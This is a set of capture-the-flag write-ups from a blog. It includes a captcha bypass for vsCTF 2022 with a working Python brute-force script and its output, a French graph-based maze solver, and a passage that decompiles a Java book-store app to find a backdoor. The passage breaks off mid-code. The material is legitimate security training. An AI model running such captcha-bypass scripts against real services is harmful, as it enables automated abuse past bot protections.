[{"content":"Recognition Let\u0026rsquo;s start by going to the website. We arrive on the following page:\nThis is a simple page containing what looks like a captcha. The goal seems pretty clear now: You have to validate the captcha before 10 seconds and this 1000 times in a row. To solve the captcha you need to add the two numbers shown in green.\nWhen we look a little closer at the exchanges between us and the server, we observe that when the first captcha is requested, the server sends it back to us with a JWT token (https://en.wikipedia.org/wiki/JSON_Web_Token) in the header x-captcha-state :\nIf we decode (base64) the part of the token containing the payload we get this:\nFrom :\neyJleHAiOjE2NTc0NzcxNjUsImp0aSI6IjJjY2Y2Nzg2LTdmMDYtNGFkNS04MTRmLWE2MWI1NmJkYjUxOCIsImZhaWxlZCI6ZmFsc2UsIm51bUNhcHRjaGFzU29sdmVkIjowfQ To :\n{\u0026#34;exp\u0026#34;:1657477165,\u0026#34;jti\u0026#34;:\u0026#34;2ccf6786-7f06-4ad5-814f-a61b56bdb518\u0026#34;,\u0026#34;failed\u0026#34;:false,\u0026#34;numCaptchasSolved\u0026#34;:0} The following assumptions can therefore be made:\n exp : represents the timestamp after which the token is not valid any more (the 10 seconds added to date of the generation of this token) jti : a unique identifier to differentiate our token from those of others failed : indicates whether you have already failed a step numCaptchasSolved : The number of validated steps  A first approach would be to change the value of numCaptchasSolved to 1000 in the token and send it to fool the server into thinking that you have validated all the steps. However, JWT tokens are signed and none of the various existing approaches to breaking the token signature have been successful and so another approach will have to be found.\nAnother approach would be to use OCR to retrieve the content of the captcha but this is a very tedious and uncertain approach in such a limited time.\nWhile generating a few captchas, a particularity jumped out at me :\nThe numbers generated on the different captchas were in a very close range. In truth we already have everything we need to solve the challenge but we\u0026rsquo;ll look at the source code given in the challenge to get it right\nDiving into the source code Here are the contents of the archive provided :\n├── __MACOSX │ └── vsCAPTCHA │ └── static ├── vsCAPTCHA │ ├── Dockerfile │ ├── generate.sh │ ├── src │ │ └── main.ts │ └── static │ └── index.html └── vsCAPTCHA.rar I spare you the review, the only interesting file is the source code main.ts :\nimport { createCaptcha } from \u0026#34;https://deno.land/x/captcha@v1.0.1/mods.ts\u0026#34;; import * as jose from \u0026#34;https://deno.land/x/jose@v4.8.3/index.ts\u0026#34;; import { Application, Router } from \u0026#34;https://deno.land/x/oak@v10.6.0/mod.ts\u0026#34;; const FLAG = Deno.env.get(\u0026#34;FLAG\u0026#34;) ?? \u0026#34;vsctf{REDACTED}\u0026#34;; const captchaSolutions = new Map(); interface CaptchaJWT { exp: number; jti: string; flag?: string; failed: boolean; numCaptchasSolved: number; } const jwtKey = await jose.importPKCS8( new TextDecoder().decode(await Deno.readFile(\u0026#34;./jwtRS256.key\u0026#34;)), \u0026#34;RS256\u0026#34; ); const jwtPubKey = await jose.importSPKI( new TextDecoder().decode(await Deno.readFile(\u0026#34;./jwtRS256.key.pub\u0026#34;)), \u0026#34;RS256\u0026#34; ); const app = new Application(); const router = new Router(); const b1 = Math.floor(Math.random() * 500); const b2 = Math.floor(Math.random() * 500); router.get(\u0026#34;/\u0026#34;, (ctx) =\u0026gt; { return ctx.send({ path: \u0026#34;index.html\u0026#34;, root: \u0026#34;./static\u0026#34;, }); }); router.post(\u0026#34;/captcha\u0026#34;, async (ctx) =\u0026gt; { const stateJWT = ctx.request.headers.get(\u0026#34;x-captcha-state\u0026#34;); const body = await ctx.request.body({ type: \u0026#34;json\u0026#34;, }).value; const solution = body.solution; let jwtPayload: CaptchaJWT = { // 10 seconds to solve  exp: Math.round(Date.now() / 1000) + 10, jti: crypto.randomUUID(), failed: false, numCaptchasSolved: 0, }; if (stateJWT) { try { const { payload } = await jose.jwtVerify(stateJWT, jwtPubKey); jwtPayload.numCaptchasSolved = payload.numCaptchasSolved; if ( !captchaSolutions.get(payload.jti) || captchaSolutions.get(payload.jti) !== solution ) { const jwt = await new jose.SignJWT({ failed: true, numCaptchasSolved: payload.numCaptchasSolved, exp: payload.exp, }) .setProtectedHeader({ alg: \u0026#34;RS256\u0026#34; }) .sign(jwtKey); ctx.response.headers.set(\u0026#34;x-captcha-state\u0026#34;, jwt); ctx.response.status = 401; return; } } catch { ctx.response.status = 400; return; } jwtPayload.numCaptchasSolved += 1; } const num1 = Math.floor(Math.random() * 7) + b1; const num2 = Math.floor(Math.random() * 3) + b2; const captcha = createCaptcha({ width: 250, height: 150, // @ts-ignore provided options are merged with default options  captcha: { text: `${num1}+ ${num2}`, }, }); ctx.response.headers.set(\u0026#34;content-type\u0026#34;, \u0026#34;image/png\u0026#34;); if (jwtPayload.numCaptchasSolved \u0026gt;= 1000) { jwtPayload.flag = FLAG; } ctx.response.headers.set( \u0026#34;x-captcha-state\u0026#34;, await new jose.SignJWT(jwtPayload as unknown as jose.JWTPayload) .setProtectedHeader({ alg: \u0026#34;RS256\u0026#34; }) .sign(jwtKey) ); captchaSolutions.set(jwtPayload.jti, num1 + num2); ctx.response.status = 200; ctx.response.body = captcha.image; }); app.use(router.routes()); await app.listen({ port: 8080 }); When the server starts, these two global variables are initialized and will remain so until the server is shut down (they will be important for the future) :\nconst b1 = Math.floor(Math.random() * 500); const b2 = Math.floor(Math.random() * 500); Math.random() generates a pseudo-random number between 0 (included) and 1 (excluded)\n b1 will have a value between 0 (included) and 500 (excluded) b2 will have a value between 0 (included) and 500 (excluded)  This piece of code is the heart of the challenge and is executed for each request to /captcha :\nconst num1 = Math.floor(Math.random() * 7) + b1; const num2 = Math.floor(Math.random() * 3) + b2; const captcha = createCaptcha({ width: 250, height: 150, // @ts-ignore provided options are merged with default options  captcha: { text: `${num1}+ ${num2}`, }, }); It is this part that generates the numbers to add up to solve the captcha and sends the two numbers to a library that will generate an image of this style :\nWe are especially interested in these two lines because they will generate the numbers to be guessed :\nconst num1 = Math.floor(Math.random() * 7) + b1; const num2 = Math.floor(Math.random() * 3) + b2; Our previous intuition was correct because it does have a very short interval for the generated numbers (I will explain with num1 but it is the same principle for num2) :\n Math.random() generates a number in the interval [0,1[ *7 generates a number in the interval [0*7,1*7[ = [0,7[ Math.floor() generates a number in this range : [0,1,2,3,4,5,6,7[ (in the previous step, real numbers were taken into account) + b1 adds the number generated when the server is started so the range become : [b1,b1+1,b1+2,b1+3,b1+4,b1+5,b1+6,b1+7[  So for num1 we just need to find b1 and there will be only 7 possibilities to find the generated number\nSimilarly for num2 we just need to find b2 and there will be only 3 possibilities to find the generated number ([b2,b2+1,b2+2,b2+3[)\nFinding the solution of the captcha Knowing that num1 has a maximum interval of 6 and num2 of 2, if we generate some captcha it will be enough to find (for example for num1) two numbers which have a difference of 6 and it will be the extremities of the range, the smallest of these two being b1\nAfter several captcha generations we get the following list:\n   num1 num2     160 427   155 425   156 426   154 426    So b1 = 154 and b2 = 425\n(remember that these numbers were generated at the very beginning of the program as global variables and will therefore not change during the various queries)\nThe value of num1 will therefore be in the following range: [154,155,156,157,158,159,160,161[\nThe value of num2 will therefore be in the following range: [425,426,427,428[\nAnd so the solution of the captcha which is equal to num1 + num2 will be one of the following 9 cases : [579, 580, 581, 582, 583, 584, 585, 586, 587]\nSo to solve the captcha you will have to send 9 requests before 10 seconds in the worst case.\nPreparing the payload router.post(\u0026#34;/captcha\u0026#34;, async (ctx) =\u0026gt; { const stateJWT = ctx.request.headers.get(\u0026#34;x-captcha-state\u0026#34;); The header x-captcha-state containing the JWT token must be sent with each request because it contains 2 crucial pieces of information:\n exp : represents the timestamp after which the token is not valid any more (the 10 seconds added to date of the generation of this token) jti : a unique identifier to differentiate our token from those of others  When you fail to send a solution, the server returns a 401 error but keeps the unique identifier in memory so that you can retry within 10 seconds:\nif ( !captchaSolutions.get(payload.jti) || captchaSolutions.get(payload.jti) !== solution ) { const jwt = await new jose.SignJWT({ failed: true, numCaptchasSolved: payload.numCaptchasSolved, exp: payload.exp, }) .setProtectedHeader({ alg: \u0026#34;RS256\u0026#34; }) .sign(jwtKey); ctx.response.headers.set(\u0026#34;x-captcha-state\u0026#34;, jwt); ctx.response.status = 401; return; } When a step is passed, a new captcha is generated and an updated token is returned (updating its exp value to have the 10 second delay for the new step) :\n[...] jwtPayload.numCaptchasSolved += 1; [...] const captcha = createCaptcha({ width: 250, height: 150, // @ts-ignore provided options are merged with default options  captcha: { text: `${num1}+ ${num2}`, }, }); ctx.response.headers.set(\u0026#34;content-type\u0026#34;, \u0026#34;image/png\u0026#34;); if (jwtPayload.numCaptchasSolved \u0026gt;= 1000) { jwtPayload.flag = FLAG; } ctx.response.headers.set( \u0026#34;x-captcha-state\u0026#34;, await new jose.SignJWT(jwtPayload as unknown as jose.JWTPayload) .setProtectedHeader({ alg: \u0026#34;RS256\u0026#34; }) .sign(jwtKey) ); captchaSolutions.set(jwtPayload.jti, num1 + num2); ctx.response.status = 200; ctx.response.body = captcha.image; The logic of resolution will therefore be as follows: Send a request with the same token until you send a valid solution which will then answer the request with :\n 200 Code Status New captcha Updated JWT  Repeat the operation with the new JWT token, until you reach step 1000 which will contain the flag in the JWT :\nif (jwtPayload.numCaptchasSolved \u0026gt;= 1000) { jwtPayload.flag = FLAG; } Implementation of the solution import requests headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} # Default headers sess = requests.Session() # Needed to have persistent connection (don\u0026#39;t recreate a TCP session for each request) response = sess.post(\u0026#34;https://vscaptcha-twekqonvua-uc.a.run.app/captcha\u0026#34;,headers=headers,json={\u0026#34;solution\u0026#34;:1337}) # Get the first captcha headers[\u0026#34;x-captcha-state\u0026#34;] = response.headers[\u0026#34;x-captcha-state\u0026#34;] # Retrieve JWT for step in range(1,1001): for possibleCaptchaSolution in [581, 582, 583, 584, 585,580, 586, 587, 579 ]: # All possible solution response = sess.post(\u0026#34;https://vscaptcha-twekqonvua-uc.a.run.app/captcha\u0026#34;,headers=headers,json={\u0026#34;solution\u0026#34;:possibleCaptchaSolution}) print(\u0026#34;Step \u0026#34;,step,\u0026#34; | Trying : \u0026#34;,possibleCaptchaSolution, response.status_code, response.headers if step==1000 else None) if response.status_code == 200: # Return 200 only if correct solution, else 401 or 400. headers[\u0026#34;x-captcha-state\u0026#34;] = response.headers[\u0026#34;x-captcha-state\u0026#34;] break print(\u0026#34;-\u0026#34;*30) If you are attentive you have surely seen that the possible numbers for the solution are not in order: indeed normally there are 7*3 = 21 possibilities, however some of them are identical (when we perform num1+num2) and some have therefore more chance to appear than others: {579: 1, 580: 2, 581: 3, 582: 3, 583: 3, 584: 3, 585: 3, 586: 2, 587: 1}\n$ python3 vsCaptchaSolver.py Step 1 | Trying : 581 200 None ------------------------------ Step 2 | Trying : 581 200 None ------------------------------ Step 3 | Trying : 581 401 None Step 3 | Trying : 582 401 None Step 3 | Trying : 583 200 None ------------------------------ [...] Step 998 | Trying : 581 200 None ------------------------------ Step 999 | Trying : 581 401 None Step 999 | Trying : 582 401 None Step 999 | Trying : 583 200 None ------------------------------ Step 1000 | Trying : 581 200 {\u0026#39;content-type\u0026#39;: \u0026#39;image/png\u0026#39;, \u0026#39;x-captcha-state\u0026#39;: \u0026#39;eyJhbGciOiJSUzI1NiJ9.eyJleHAiOjE2NTc0OTcwODYsImp0aSI6IjI5ZmU0YThmLTdlMzctNGRmOS04YTk2LWU2YzhlZTM3YjZlOCIsImZhaWxlZCI6ZmFsc2UsIm51bUNhcHRjaGFzU29sdmVkIjoxMDAwLCJmbGFnIjoidnNjdGZ7YXV0MG00dDNkX2FjdDF2aXR5X2QzdGVjdGVkX3MwbHYzXzEwMDBfbTByM19jNHB0Y2hhNV90MF9jMG50aW51M30ifQ.QDUmhUt4TXGMLdje8gz5PiYn32Io9rFyCWCx_arheLbRVrXk75XSdPYh01tXbAkva92ElnpWZ0YACbPbOFy1KMbcb87T5U9HM5B6O8fxlaCJR4oz4-PHqFnBllOgUsISw_WTnS4K-hVNK7INijB0HfO36Rz_42sqpgzi2KYimRz0duwLtcB16HBnBmBC9vOdI-0ccyJzKuwSUUsryN_28-7jMoLbVKm2y1gaaIsoFRLulTM__0Bge2XGxQGbv-nAJw-9JHVoFSnL9ixYlbSYDpqp-1EseskJZOMtAf_vrYR_2ummMCBelpWmYQl3ZmQLgtTZ4XxH5zkxnyphRG7zvlxWTz72aMjcOQZzEzmtQXHUW60zoM7rwJTSiw7PCDrv2jME6PvcOjNUAfbVbXhzN3XXUEwlexk2ljZU3JepeD2veLk2GdJHYW6yTbkgKrlWsytMxgC9QyxugD3I3XQOmzzzKr39nvou7l8YRuwCt_KIt_RdU7mCvFunF9dlgLbZBMErTinzYF56eXQIfnOuZcfWluAL5x3noH4TwmTLcS2xUAla9oRAp28uUh_LGrMZzeTKNv0OieQ39guDMCx5TUhpwoQdCK1K7IqS4ki9xBAJmflqkb1X162FqHgjjmQhMg5NEnQ0U2jqpB8MGsLwJvpaZK8LuheGKxN9McR0rds\u0026#39;, \u0026#39;vary\u0026#39;: \u0026#39;Accept-Encoding\u0026#39;, \u0026#39;X-Cloud-Trace-Context\u0026#39;: \u0026#39;a9942d25c6e60d9ad60c5e3a0e8d9253\u0026#39;, \u0026#39;Date\u0026#39;: \u0026#39;Sun, 10 Jul 2022 23:51:15 GMT\u0026#39;, \u0026#39;Server\u0026#39;: \u0026#39;Google Frontend\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;7418\u0026#39;, \u0026#39;Alt-Svc\u0026#39;: \u0026#39;h3=\u0026#34;:443\u0026#34;; ma=2592000,h3-29=\u0026#34;:443\u0026#34;; ma=2592000,h3-Q050=\u0026#34;:443\u0026#34;; ma=2592000,h3-Q046=\u0026#34;:443\u0026#34;; ma=2592000,h3-Q043=\u0026#34;:443\u0026#34;; ma=2592000,quic=\u0026#34;:443\u0026#34;; ma=2592000; v=\u0026#34;46,43\u0026#34;\u0026#39;} Get the flag inside the payload of JWT token :\n{\u0026#34;exp\u0026#34;:1657497086,\u0026#34;jti\u0026#34;:\u0026#34;29fe4a8f-7e37-4df9-8a96-e6c8ee37b6e8\u0026#34;,\u0026#34;failed\u0026#34;:false,\u0026#34;numCaptchasSolved\u0026#34;:1000,\u0026#34;flag\u0026#34;:\u0026#34;vsctf{aut0m4t3d_act1vity_d3tected_s0lv3_1000_m0r3_c4ptcha5_t0_c0ntinu3}\u0026#34;} FLAG : vsctf{aut0m4t3d_act1vity_d3tected_s0lv3_1000_m0r3_c4ptcha5_t0_c0ntinu3}\n","date":"2022-07-10T00:00:00Z","image":"https://endeavxor.github.io/cover.jpg","permalink":"https://endeavxor.github.io/p/vsctf-2022-vscaptcha/","title":"vsCTF 2022 - vsCAPTCHA"},{"content":"Description Vous trouverez la description complète du challenge ici : challenge.md\nRapide retour au monde des mathématiques Avant de plonger plus en détail sur la stratégie adoptée, je vais faire un rapide retour sur les notions nécessaires à sa compréhension.(Vous pouvez passer à la suite si vous êtes déjà familier avec les graphes)\nLes graphes Un graphe est simplement constitué d\u0026rsquo;un ensemble de sommets et d\u0026rsquo;arêtes (qui indique quel sommet est relié à quel autre sommet)\nLes graphes sont des objets/structures mathématiques qui ont été profondément étudié aux travers des siècles et disposent donc de nombreux d\u0026rsquo;algorithmes pour résoudre des problèmes souvent complexes avec plus de facilité qu\u0026rsquo;un algorithme dans des paradigmes classiques.\nVoici quelques exemples de graphes (il en existe d\u0026rsquo;autres adapté à différents problèmes):\nLe premier est le plus commun, le second est un graphe dit \u0026ldquo;étiqueté\u0026rdquo; et le dernier, qui va nous intéresser pour ce challenge, est un graphe dit \u0026ldquo;orienté\u0026rdquo;. En effet comme on peut le constater, ce ne sont pas des arêtes mais des arcs, rendant la liaison entre deux sommets unidirectionnelle et non bidirectionnelle comme c\u0026rsquo;était le cas auparavant.\nCircuit dans un graphe orienté  Wikipedia https://fr.wikipedia.org/wiki/Circuit_(th%C3%A9orie_des_graphes)\n\u0026ndash; Dans un graphe orienté, on appelle circuit une suite d\u0026rsquo;arcs consécutifs (chemin) dont les deux sommets aux extrémités sont identiques Pour illustrer, voici en rouge des circuits dans des graphes orientés :\nNous allons pour ce challenge nous intéresser à des circuits élémentaires, correspondant aux boucles, qui ne sont ni plus ni moins que des circuits dont chaque sommet n\u0026rsquo;apparaît qu\u0026rsquo;une seule fois (ce qui n\u0026rsquo;est pas le cas par exemple d\u0026rsquo;un des circuits dans le second graphe : x2-\u0026gt;x4-\u0026gt;x3-\u0026gt;x5-\u0026gt;x6-\u0026gt;x3-\u0026gt;x2 )\nEt bien si vous avez compris ça, vous avez toutes les clés en main pour résoudre le challenge très facilement :)\nPour ceux qui ne se seraient pas intéressé aux graphes, je vous conseille grandement d\u0026rsquo;y jeter un oeil car si vous arrivez à modéliser un problème sous forme de graphes, il a de forte chance qu\u0026rsquo;un algorithme puisse vous faciliter la vie pour sa résolution\nRetour sur le challenge et explication de la stratégie Laissons de côté les graphes un court instant et revenons sur notre problème : une fois arrivé sur une case qui impose une direction (R,L,D ou U), nous devons suivre cette direction jusqu\u0026rsquo;à arriver sur un des quatre cas suivant :\n Sur un point (.) Sur une nouvelle direction (R,L,D ou U) Hors du labyrithe Sur une case spéciale ( - ou | ) dont le traitement varie selon la direction empruntée et la case en question  Si l\u0026rsquo;on schématise ce parcours sur un des exemples voici ce que l\u0026rsquo;on a :\nComme on peut le remarquer, les points ('.') sont redondants et on pourrait simplement aller directement à la prochaine case. Si l\u0026rsquo;on connecte entre elles les cases sans passer par les points et qu\u0026rsquo;on retire aussi les cas où l\u0026rsquo;on est bloqué (par exemple \u0026lsquo;|\u0026rsquo; ici), on obtient un parcours bien plus digeste :\nEt si vous ne voyez toujours pas où je veux en venir, retirons le labyrinthe :\nEh bien nous voilà en présence d\u0026rsquo;un magnifique graphe composé de 2 circuits élémentaires ! Exactement ce que nous recherchions.\nTrès bien cela saute aux yeux qu\u0026rsquo;il y a 2 circuits élémentaires, mais comment fait-on pour les trouver ? Et bien comme expliqué plus haut, les graphes ont été grandement étudié et il existe déjà des algorithmes qui permettent de trouver des circuits élémentaires dans un graphe orienté. Dans notre cas, l\u0026rsquo;algorithme présent dans la librairie que nous utiliserons sera celui de DONALD B. JOHNSON (https://www.cs.tufts.edu/comp/150GA/homeworks/hw1/Johnson%2075.PDF) disposant d\u0026rsquo;une complexité linéaire.\nGrâce à la modélisation du problème sous forme de graphe, le challenge se simplifie en : \u0026ldquo;Représentez le labyrinthe sous forme de graphe\u0026rdquo;, bien plus simple non :) ?\nImplémentation de la solution from enum import Enum # Servira pour factoriser le code from pwn import * # Facilite la communication avec le serveur import networkx as nx # Implémente la notion de Graphe et ses algorithmes DIRECTIONS_NODES = [\u0026#39;R\u0026#39;,\u0026#39;L\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;U\u0026#39;] SPECIALS_NODES = [\u0026#39;-\u0026#39;,\u0026#39;|\u0026#39;] conn = remote(\u0026#34;172.17.0.2\u0026#34;,7000) class Direction(Enum): \u0026#39;\u0026#39;\u0026#39; Classe de type Enum qui facilite la factorisation du code. Le déplacement dans le labyrinthe se faisant dans une seule direction et d\u0026#39;une seule case à la fois, chaque direction est composé d\u0026#39;un tuple : (déplacement ligne, déplacement colonne). \u0026#39;\u0026#39;\u0026#39; RIGHT = (0,1) LEFT = (0,-1) DOWN = (1,0) UP = (-1,0) def connectNode(currentRowIndex,currentColumnIndex,direction): \u0026#39;\u0026#39;\u0026#39; Fonction permettant de connecter deux noeuds entre eux et de les ajouter au graphe G. @param: currentRowIndex L\u0026#39;index de la ligne de la case en cours d\u0026#39;analyse @param: currentRowIndex L\u0026#39;index de la colonne de la case en cours d\u0026#39;analyse @param: direction La direction pour trouver la prochaine case à lier à la case en cours d\u0026#39;analyse \u0026#39;\u0026#39;\u0026#39; dRow,dCol = direction.value # Récupère le déplacement à faire sur les lignes et colonnes nextRowIndex = currentRowIndex + dRow # L\u0026#39;index de la ligne de la prochaine case  nextColumnIndex = currentColumnIndex +dCol # L\u0026#39;index de la colonne de la prochaine case  # Tant que la prochaine case n\u0026#39;est pas hors du labyrinthe while 0 \u0026lt;= nextRowIndex \u0026lt;= numberOfRows -1 and 0 \u0026lt;= nextColumnIndex \u0026lt;= numberOfColumns - 1: nextNode = maze[nextRowIndex][nextColumnIndex] # Récupère la prochaine case # 2 cases sont connectées entre-elles uniquement lorsque l\u0026#39;une de ces conditions est établie : if (nextNode in DIRECTIONS_NODES) or (nextNode == \u0026#34;-\u0026#34; and dRow !=0) or (nextNode == \u0026#34;|\u0026#34; and dCol!=0): # On connecte nos deux cases en les nommant par leurs positions dans le labyrinthe G.add_edge(str(currentRowIndex)+str(currentColumnIndex),str(nextRowIndex)+str(nextColumnIndex)) if nextNode in SPECIALS_NODES: # La case spéciale sera traitée après specialNodes.add((nextRowIndex,nextColumnIndex)) return if nextNode !=\u0026#34;.\u0026#34;: return # Va à la prochaine case  nextRowIndex += dRow nextColumnIndex += dCol for i in range(16): # Il y a 16 labyrinthe à traiter G = nx.DiGraph() # Créer un graphe orienté (directed graph) maze = conn.recvuntil(b\u0026#34;Answer \u0026gt;\u0026gt; \u0026#34;)[:-len(\u0026#34;Answer \u0026gt;\u0026gt; \u0026#34;)].strip().decode().split(\u0026#39;\\n\u0026#39;)[1:] # Ligne très moche pour récupérer le labyrinthe du serveur numberOfRows = len(maze) numberOfColumns = len(maze[0]) specialNodes = set() # Utilisation d\u0026#39;un set (aucune entrée dupliquée) pour stocker les cases spéciales (| or -) for rowIndex in range(numberOfRows): for colIndex in range(numberOfColumns): currentNode = maze[rowIndex][colIndex] if currentNode == \u0026#39;R\u0026#39;: connectNode(rowIndex,colIndex,Direction.RIGHT) elif currentNode == \u0026#39;L\u0026#39;: connectNode(rowIndex,colIndex,Direction.LEFT) elif currentNode == \u0026#39;D\u0026#39;: connectNode(rowIndex,colIndex,Direction.DOWN) elif currentNode == \u0026#39;U\u0026#39;: connectNode(rowIndex,colIndex,Direction.UP) for specialNodeCoordiantes in specialNodes.copy(): # .copy() est utilisée pour modifier dynamiquement le contenu du set() specialNodeRowIndex , specialNodeColIndex = specialNodeCoordiantes specialNode = maze[specialNodeRowIndex][specialNodeColIndex] if specialNode == \u0026#34;-\u0026#34;: # Si cette case spéciale est atteinte, elle se connecte à ce qui se trouve sur sa gauche et sa droite connectNode(specialNodeRowIndex,specialNodeColIndex,Direction.LEFT) connectNode(specialNodeRowIndex,specialNodeColIndex,Direction.RIGHT) else: # Si cette case spéciale est atteinte, elle se connecte à ce qui se trouve au-dessus et en dessous connectNode(specialNodeRowIndex,specialNodeColIndex,Direction.UP) connectNode(specialNodeRowIndex,specialNodeColIndex,Direction.DOWN) conn.send(str(len(list(nx.simple_cycles(G)))).encode()+b\u0026#39;\\n\u0026#39;) # Ligne moche qui envoie le nombre de circuits élémentaires (boucles) au serveur print(conn.recvuntil(b\u0026#39;}\u0026#39;)) # Affiche le flag conn.close() Plus qu\u0026rsquo;à lancer le tout\npython3 deadalus.py [+] Opening connection to 172.17.0.2 on port 7000: Done b\u0026#39;\\nCongratz !\\nHero{h0w_aM4ZEiNg_y0U_d1D_17_3v3n_beTt3R_th4n_4ri4dne}\u0026#39; [*] Closed connection to 172.17.0.2 port 7000 ","date":"2022-06-02T00:00:00Z","image":"https://endeavxor.github.io/p/heroctf-v4-deadalus/cover.jpg","permalink":"https://endeavxor.github.io/p/heroctf-v4-deadalus/","title":"HeroCTF V4 - Deadalus"},{"content":"TLDR  Unzip .jar Decompile .class files \u0026amp; reverse source code Find SALT Use backdoor inside source code  Unzip .jar The website simply contains a login page at first glance and the classic flaws (sqli, etc \u0026hellip;) do not seem to work\nSo I decided to look directly into the book_store.jar archive that was provided\nLet\u0026rsquo;s extract the contents of the archive:\n$ jar xf book_store.jar \u0026amp;\u0026amp; ls total 48 drwxr-xr-x 3 root root 4096 Apr 17 17:44 META-INF -rw-r--r-- 1 root root 3722 Apr 14 21:01 auth.html drwxr-xr-x 3 root root 4096 Apr 14 21:01 book -rw-r--r-- 1 root root 1391 Apr 14 21:01 book.json -rwxr-xr-x 1 root root 21283 Apr 17 17:33 book_store.jar -rw-r--r-- 1 root root 6543 Apr 14 21:01 home.html After investigation and comparison with the site provided in the description of the challenge, the archive contains the source code.\nDecompile .class files \u0026amp; reverse source code One of the directories contains the source code compiled from java files\n$ ls -l book/store/ -rw-r--r-- 1 root root 1200 Apr 14 21:01 App.class -rw-r--r-- 1 root root 1596 Apr 14 21:01 \u0026#39;Art$ASCIIArtFont.class\u0026#39; -rw-r--r-- 1 root root 3154 Apr 14 21:01 Art.class -rw-r--r-- 1 root root 1396 Apr 14 21:01 LogJob.class -rw-r--r-- 1 root root 5450 Apr 14 21:01 Logger.class -rw-r--r-- 1 root root 1407 Apr 14 21:01 \u0026#39;ServerSide$BookHandler.class\u0026#39; -rw-r--r-- 1 root root 1447 Apr 14 21:01 \u0026#39;ServerSide$LandingPageServer.class\u0026#39; -rw-r--r-- 1 root root 1928 Apr 14 21:01 \u0026#39;ServerSide$LoginHandler.class\u0026#39; -rw-r--r-- 1 root root 1418 Apr 14 21:01 \u0026#39;ServerSide$LoginPageServer.class\u0026#39; -rw-r--r-- 1 root root 5815 Apr 14 21:01 ServerSide.class Luckily the .class files are made up of Java bytecode in order to run in the JVM (Java is a semi-interpreted language and not fully compiled), this will make it easier for us to reverse as each bytecode can be \u0026ldquo;\u0026ldquo;\u0026ldquo;decompiled\u0026rdquo;\u0026rdquo;\u0026rdquo; into a java instruction almost identically.\nIn order to do this there are several tools and sites, I used the site http://www.javadecompilers.com/ (with CFR decompiler) and we end up with the following 5 source files :\n(click to view source code)\n LogJob.java package book.store; import book.store.App; import java.io.File; public class LogJob extends Thread { String filename; public LogJob(String filename) { this.filename = filename; } private void deleteLogFile() { File f = new File(this.filename + \u0026#34;.log\u0026#34;); if (f.delete()) { App.ss.logger.info(\u0026#34;Successfully deleted logfile!\u0026#34;); } else { App.ss.logger.warning(\u0026#34;File must be empty!\u0026#34;); } } @Override public void run() { while (true) { try { Thread.sleep(120000 L); } catch (Exception e) { System.err.println(e.getMessage()); } this.deleteLogFile(); } } }    ServerSide.java package book.store; import book.store.App; import book.store.Logger; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.io.UnsupportedEncodingException; import java.math.BigInteger; import java.net.InetSocketAddress; import java.net.URLDecoder; import java.security.MessageDigest; import java.util.HashMap; import java.util.Scanner; public class ServerSide { StringBuilder index_page_html; StringBuilder landing_page_html; StringBuilder book_json; HttpServer server; int server_port; Logger logger; public ServerSide(int server_port) { try { this.landing_page_html = new StringBuilder(); this.index_page_html = new StringBuilder(); this.book_json = new StringBuilder(); this.logger = new Logger(this.getClass().getName()); this.server_port = server_port; this.loadIndexPage(); this.loadLandingPage(); this.loadBook(); this.setupRoutes(); } catch (Exception e) { this.logger.error(\u0026#34;FATAL :(\u0026#34;); this.logger.error(e.getMessage()); } } private void loadIndexPage() { InputStream is = ServerSide.class.getResourceAsStream(\u0026#34;/auth.html\u0026#34;); Scanner s = new Scanner(is).useDelimiter(\u0026#34;\\\\A\u0026#34;); while (s.hasNext()) { this.index_page_html.append(s.next()); } this.logger.debug(\u0026#34;Auth page loaded in memory\u0026#34;); s.close(); } private void loadLandingPage() { InputStream is = ServerSide.class.getResourceAsStream(\u0026#34;/home.html\u0026#34;); Scanner s = new Scanner(is).useDelimiter(\u0026#34;\\\\A\u0026#34;); while (s.hasNext()) { this.landing_page_html.append(s.next()); } this.logger.debug(\u0026#34;Landing page loaded in memory\u0026#34;); s.close(); } private void loadBook() { InputStream is = ServerSide.class.getResourceAsStream(\u0026#34;/book.json\u0026#34;); Scanner s = new Scanner(is).useDelimiter(\u0026#34;\\\\A\u0026#34;); while (s.hasNext()) { this.book_json.append(s.next()); } this.logger.debug(\u0026#34;Book contents loaded in memory\u0026#34;); s.close(); } private void setupRoutes() throws Exception { this.server = HttpServer.create(new InetSocketAddress(this.server_port), 0); this.server.createContext(\u0026#34;/\u0026#34;, new LoginPageServer()); this.server.createContext(\u0026#34;/home.html\u0026#34;, new LandingPageServer()); this.server.createContext(\u0026#34;/login\u0026#34;, new LoginHandler()); this.server.createContext(\u0026#34;/book\u0026#34;, new BookHandler()); this.server.setExecutor(null); this.server.start(); this.logger.info(\u0026#34;Started web server!\u0026#34;); } public HashMap \u0026lt; String, String \u0026gt; splitQuery(String requestUri) throws UnsupportedEncodingException { String[] pairs; HashMap \u0026lt; String, String \u0026gt; query_pairs = new HashMap \u0026lt; String, String \u0026gt; (); for (String pair: pairs = requestUri.split(\u0026#34;\u0026amp;\u0026#34;)) { int idx = pair.indexOf(\u0026#34;=\u0026#34;); query_pairs.put(URLDecoder.decode(pair.substring(0, idx), \u0026#34;UTF-8\u0026#34;), URLDecoder.decode(pair.substring(idx + 1), \u0026#34;UTF-8\u0026#34;)); } return query_pairs; } public static String getMd5(String input) { try { MessageDigest md = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;); byte[] messageDigest = md.digest(input.getBytes()); BigInteger no = new BigInteger(1, messageDigest); String hashtext = no.toString(16); while (hashtext.length() \u0026lt; 32) { hashtext = \u0026#34;0\u0026#34; + hashtext; } return hashtext; } catch (Exception e) { throw new RuntimeException(e); } } public boolean parseRequest(String requestUri) throws UnsupportedEncodingException { HashMap \u0026lt; String, String \u0026gt; query_params = this.splitQuery(requestUri); String username = query_params.get(\u0026#34;username\u0026#34;); String password = query_params.get(\u0026#34;password\u0026#34;); String hashed_username = ServerSide.getMd5(username); String hashed_password = ServerSide.getMd5(password); String mssg = \u0026#34;username: \u0026#34; + username + \u0026#34;, password: \u0026#34; + password; this.logger.info(mssg); return hashed_username.equalsIgnoreCase(\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;) \u0026amp;\u0026amp; 